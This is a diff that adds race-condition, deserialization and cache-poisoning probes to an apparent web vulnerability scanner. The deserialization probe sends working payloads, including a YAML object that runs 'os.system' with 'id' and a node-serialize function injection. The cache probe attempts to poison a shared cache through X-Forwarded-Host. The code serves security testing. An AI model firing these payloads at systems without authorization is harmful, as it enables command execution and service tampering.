@@ -602,3 +602,112 @@ def probe_upload(ctx: Context, url: str) -> dict:
     else:
         verdict = "no upload accepted or stored path undisclosed"
     return {"verdict": verdict, "results": results}
+
+
+def probe_race(ctx: Context, url: str, method: str = "GET",
+               data: str | None = None, n: int = 8) -> dict:
+    """TOCTOU / limit-exceeded check: fire n concurrent identical
+    requests. If a presumed one-time action (redeem, vote, transfer)
+    reports success more than once, the guard window raced.
+
+    Sends still respect the shared rate limiter - for true wire
+    concurrency run with a high --rate or no cap."""
+    import concurrent.futures
+
+    def _fire() -> dict:
+        return ctx.client.send(method, url, body=data,
+                               tool="probe_race", note="concurrent burst")
+
+    n = max(2, min(int(n or 8), 16))
+    with concurrent.futures.ThreadPoolExecutor(max_workers=n) as ex:
+        rs = list(ex.map(lambda _: _fire(), range(n)))
+    statuses: dict[int, int] = {}
+    for r in rs:
+        statuses[r["status"]] = statuses.get(r["status"], 0) + 1
+    ok = [r for r in rs if 200 <= r["status"] < 300]
+    if len(ok) > 1:
+        verdict = (f"race candidate: {len(ok)}/{n} concurrent requests "
+                   "succeeded - if the action is one-time it executed "
+                   f"{len(ok)}x; confirm by checking server-side state")
+    elif len(ok) == 1:
+        verdict = ("single success in burst - no race window observed "
+                   "(or the action was already consumed)")
+    else:
+        verdict = ("no success in burst; statuses "
+                   f"{statuses} - endpoint may not be one-time")
+    return {"verdict": verdict, "statuses": statuses,
+            "results": [{"status": r["status"],
+                         "request_id": r["request_id"]} for r in rs]}
+
+
+_DESER_ERRORS = re.compile(
+    r"ObjectInputStream|InvalidClassException|ClassNotFoundException|"
+    r"StreamCorruptedException|unserialize|__wakeup|Unpickler|"
+    r"pickle\.loads|cannot deserialize|SerializationException|"
+    r"yaml_parse|marshal\.load|BinaryFormatter|JsonSerializer",
+    re.I,
+)
+
+
+def probe_deserialize(ctx: Context, url: str, param: str) -> dict:
+    """Deserialization surface check: baseline then magic-bytes payloads
+    per ecosystem. A framework deserialization error means the parser
+    actually processes the field - real attack surface, not a guess."""
+    base = _send(ctx, url, param, "argus-plain", tool="probe_deserialize",
+                 note="baseline")
+    base_err = _DESER_ERRORS.search(base.get("body") or "")
+    payloads = [
+        ("java-b64", "rO0ABXQABHRlc3Q="),
+        ("php-object", 'O:8:"stdClass":0:{}'),
+        ("php-array", 'a:1:{s:1:"a";s:1:"b";}'),
+        ("python-pickle", "c__builtin__\nset\n"),
+        ("node-serialize", '{"x":"_$$ND_FUNC$$_function(){return 1}()"}'),
+        ("yaml-python", "!!python/object/apply:os.system ['id']"),
+        ("dotnet-psobject", '{"$type":"System.Object"}'),
+    ]
+    hits = []
+    for name, pl in payloads:
+        r = _send(ctx, url, param, pl, tool="probe_deserialize", note=name)
+        body = r.get("body") or ""
+        m = _DESER_ERRORS.search(body)
+        hits.append({"name": name, "status": r["status"],
+                     "request_id": r["request_id"],
+                     "marker": m.group(0) if m else None})
+    strong = next((h for h in hits if h["marker"]
+                   and h["marker"] != (base_err.group(0) if base_err else None)),
+                  None)
+    if strong:
+        verdict = ("deserialization surface: parser error "
+                   f"'{strong['marker']}' on {strong['name']} payload - "
+                   "the field reaches a deserializer")
+    elif any(h["marker"] for h in hits):
+        verdict = "deserializer errors seen but also at baseline"
+    else:
+        verdict = "no deserialization signal"
+    return {"verdict": verdict, "base_id": base["request_id"],
+            "results": hits}
+
+
+def probe_cache(ctx: Context, url: str) -> dict:
+    """Cache-poisoning check: poison attempt via unkeyed X-Forwarded-Host,
+    then a clean fetch - poisoned bytes served to the clean request means
+    the header is unkeyed input into a shared cache."""
+    c1, c2 = f"{_marker('cp')}.invalid", f"{_marker('cq')}.invalid"
+    ctx.client.send("GET", url, headers={"X-Forwarded-Host": c1},
+                    tool="probe_cache", note="poison attempt")
+    clean = ctx.client.send("GET", url, tool="probe_cache",
+                            note="clean fetch")
+    refl = ctx.client.send("GET", url, headers={"X-Forwarded-Host": c2},
+                           tool="probe_cache", note="reflection check")
+    clean_body = clean.get("body") or ""
+    refl_body = refl.get("body") or ""
+    if c1 in clean_body:
+        verdict = ("cache-poisoning candidate: unkeyed X-Forwarded-Host "
+                   "persisted into a response served to a clean request")
+    elif c2 in refl_body:
+        verdict = ("X-Forwarded-Host reflected but not cached - header "
+                   "is likely keyed or no shared cache")
+    else:
+        verdict = "no cache/xfh signal"
+    return {"verdict": verdict, "clean_id": clean["request_id"],
+            "reflect_id": refl["request_id"]}
